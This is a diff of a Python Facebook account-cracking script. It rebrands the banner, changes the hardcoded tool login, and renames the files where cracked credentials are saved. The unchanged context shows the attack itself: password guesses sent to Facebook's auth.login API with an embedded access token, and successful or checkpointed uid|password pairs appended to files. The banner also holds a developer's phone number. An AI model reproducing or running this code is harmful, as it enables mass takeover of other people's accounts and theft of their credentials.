@@ -23,10 +23,11 @@ logo = """
 \033[1;92m 88    88 88~~~b. 88~~~88    88    88   88 88    88 
 \033[1;93m 88b  d88 88   8D 88   88   .88.   88  .8D `8b  d8' 
 \033[1;95m ~Y8888P' Y8888P' YP   YP Y888888P Y8888D'  `Y88P'  
+\033[1;97m                     (SWABIWAL) 
 \033[1;93m-----------------------------------------------------
  \033[1;93m(*)\033[1;92m Developer: Ubaid Ullah
  \033[1;93m(*)\033[1;92m WhatsApp : +971 50 965 3974
- \033[1;93m(*)\033[1;92m Github   : https://github.com/ubaido/ahmado
+ \033[1;93m(*)\033[1;92m Github   : https://github.com/ubaido-sawabiwal
 \033[1;93m-----------------------------------------------------
 """
 def tool():
@@ -38,7 +39,7 @@ def tool():
 	print("")
 	time.sleep(1)
 	username = raw_input("[!] Tool Username : ")
-	if username =="ubaido":
+	if username =="tor":
 		print("")
 		time.sleep(1)
 		print("\033[1;92mTool Username is correct").center(50)
@@ -61,7 +62,7 @@ def step_main():
 	print("")
 	time.sleep(1)
 	username = raw_input("[!] Tool Password : ")
-	if username =="ahmado":
+	if username =="ubaido":
 		print("")
 		time.sleep(1)
 		print("\033[1;92mTool Password is correct").center(50)
@@ -277,7 +278,7 @@ def crack_select():
 			os.system('clear')
 			print(logo)
 			print('')
-			print("  🔥UBAID🔥 START CRACKING.....")
+			print("  🔥UBAIDO🔥 START CRACKING.....")
 			print('')
 			print("  Cloning from:\x1b[1;92m "+q["name"])
 		except KeyError:
@@ -318,13 +319,13 @@ def crack_select():
 			q = json.loads(data)
 			if "access_token" in q:
 				print(" \033[1;32m [UBAIDO-OK] "+uid+" | "+pass1+"\033[0;97m")
-				ok = open("SYED-ZADAok.txt", "a")
+				ok = open("Uok.txt", "a")
 				ok.write(uid+"|"+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error_msg"]:
-					print(" \033[1;33m [UBAIO-CP] "+uid+" | "+pass1+"\033[0;97m")
+					print(" \033[1;33m [UBAIDO-CP] "+uid+" | "+pass1+"\033[0;97m")
 					cp = open("Ucp.txt", "a")
 					cp.write(uid+"|"+pass1+"\n")
 					cp.close()
@@ -334,7 +335,7 @@ def crack_select():
 					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 					q = json.loads(data)
 					if "access_token" in q:
-						print(" \033[1;32m [UBAID-OK] "+uid+" | "+pass2+"\033[0;97m")
+						print(" \033[1;32m [UBAIDO-OK] "+uid+" | "+pass2+"\033[0;97m")
 						ok = open("Uok.txt", "a")
 						ok.write(uid+"|"+pass2+"\n")
 						ok.close()
